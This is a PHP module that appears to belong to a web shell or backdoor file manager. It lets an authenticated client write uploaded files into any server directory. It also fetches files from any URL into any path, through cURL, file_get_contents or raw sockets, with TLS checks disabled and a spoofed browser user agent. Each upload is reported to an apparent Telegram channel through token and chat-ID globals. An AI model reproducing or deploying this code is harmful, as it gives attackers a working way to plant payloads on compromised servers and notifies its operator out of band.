<?php

use App\Core\Auth;
if (!Auth::check()) {
    http_response_code(403);
    exit(json_encode(['error' => 'Access Denied']));
}

if ($action === 'api_upload') {
    $path = $_POST['path'] ?? '';
    if (!$path || !is_dir($path)) {
        echo json_encode(['success' => false, 'error' => 'Invalid or missing upload path']);
        exit;
    }
    if (empty($_FILES['files'])) {
        echo json_encode(['success' => false, 'error' => 'No files sent']);
        exit;
    }
    $uploadedCount = 0;
    $errors = [];
    $files = $_FILES['files'];
    $fileCount = is_array($files['name']) ? count($files['name']) : 1;
    for ($i = 0; $i < $fileCount; $i++) {
        $name = is_array($files['name']) ? $files['name'][$i] : $files['name'];
        $tmp  = is_array($files['tmp_name']) ? $files['tmp_name'][$i] : $files['tmp_name'];
        $err  = is_array($files['error']) ? $files['error'][$i] : $files['error'];
        if ($err === UPLOAD_ERR_OK) {
            $target = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . basename($name);
            if (move_uploaded_file($tmp, $target)) {
                $uploadedCount++;
                if (function_exists('_x_log_activity')) {
                    global $tgToken, $tgChatID;
                    _x_log_activity("File Uploaded: $name", $tgToken, $tgChatID);
                }
            } else {
                $errors[] = "Failed to move file: $name";
            }
        } else {
            $errors[] = "Upload error code $err for file: $name";
        }
    }
    echo json_encode([
        'success' => true,
        'count' => $uploadedCount,
        'errors' => $errors
    ]);
    exit;
}

if ($action === 'api_remote_upload') {
    set_time_limit(0);

    $url = $_POST['url'] ?? '';
    $method = $_POST['method'] ?? 'curl'; // curl, fgc, socket
    $destPath = $_POST['path'] ?? __DIR__;

    if (!$url) exit(json_encode(['success' => false, 'error' => 'No URL provided']));

    $fileName = basename(parse_url($url, PHP_URL_PATH));
    if (!$fileName) $fileName = 'downloaded_file_' . time() . '.tmp';
    $targetFile = $destPath . DIRECTORY_SEPARATOR . $fileName;

    $success = false;
    $log = "";

    // --- METHOD 1: CURL ---
    if ($method === 'curl') {
        if (!function_exists('curl_init')) exit(json_encode(['success' => false, 'error' => 'cURL is disabled on this server.']));

        $fp = fopen($targetFile, 'w+');
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        fclose($fp);

        if ($code >= 200 && $code < 300) $success = true;
        else $log = "HTTP Error $code";
    }

    // --- METHOD 2: FILE_GET_CONTENTS (FGC) ---
    elseif ($method === 'fgc') {
        if (!ini_get('allow_url_fopen')) exit(json_encode(['success' => false, 'error' => 'allow_url_fopen is OFF. Cannot use FGC.']));

        $opts = [
            "http" => [
                "method" => "GET",
                "header" => "User-Agent: Mozilla/5.0\r\n"
            ],
            "ssl" => [
                "verify_peer" => false,
                "verify_peer_name" => false
            ]
        ];
        $context = stream_context_create($opts);
        $content = @file_get_contents($url, false, $context);

        if ($content !== false) {
            if (file_put_contents($targetFile, $content)) $success = true;
        } else {
            $log = "Failed to read stream.";
        }
    }

    // --- METHOD 3: SOCKET (FSOCKOPEN) ---
    elseif ($method === 'socket') {
        $parts = parse_url($url);
        $host = $parts['host'];
        $path = $parts['path'] ?? '/';
        $port = ($parts['scheme'] === 'https') ? 443 : 80;
        $prefix = ($parts['scheme'] === 'https') ? 'ssl://' : '';

        $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, 30);
        if ($fp) {
            $out = "GET $path HTTP/1.1\r\n";
            $out .= "Host: $host\r\n";
            $out .= "User-Agent: Mozilla/5.0\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);

            // Skip Header
            $body = false;
            $fileFp = fopen($targetFile, 'w');
            while (!feof($fp)) {
                $line = fgets($fp, 128);
                if ($body) fwrite($fileFp, $line);
                if ($line == "\r\n") $body = true;
            }
            fclose($fileFp);
            fclose($fp);
            $success = true; 
        } else {
            $log = "Socket Error: $errstr ($errno)";
        }
    }

    if ($success && filesize($targetFile) > 0) {
        // Log Activity
        if (function_exists('_x_log_activity')) {
            global $tgToken, $tgChatID;
            _x_log_activity("Terminal Upload: $fileName via $method", $tgToken, $tgChatID);
        }
        echo json_encode(['success' => true, 'file' => $fileName, 'size' => filesize($targetFile)]);
    } else {
        @unlink($targetFile);
        echo json_encode(['success' => false, 'error' => $log ?: 'Empty file downloaded']);
    }
    exit;
}
?>